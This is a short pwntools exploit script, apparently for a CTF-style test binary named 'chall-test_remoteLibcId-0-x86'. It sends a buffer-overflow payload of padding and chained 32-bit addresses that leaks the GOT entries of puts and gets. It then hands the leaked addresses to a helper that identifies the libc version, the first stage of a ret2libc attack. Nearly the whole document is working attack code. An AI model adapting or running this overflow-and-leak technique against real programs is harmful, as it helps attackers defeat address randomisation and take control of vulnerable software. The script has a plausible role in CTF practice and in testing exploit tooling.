from pwn import *

import TheNight

import sys

target = process("./chall-test_remoteLibcId-0-x86")
payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8049080)
payload += p32(0x8049080)
payload += p32(0x804c010)
payload += p32(0x804c00c)
target.sendline(payload)
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "gets"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "gets", gotAddress1)
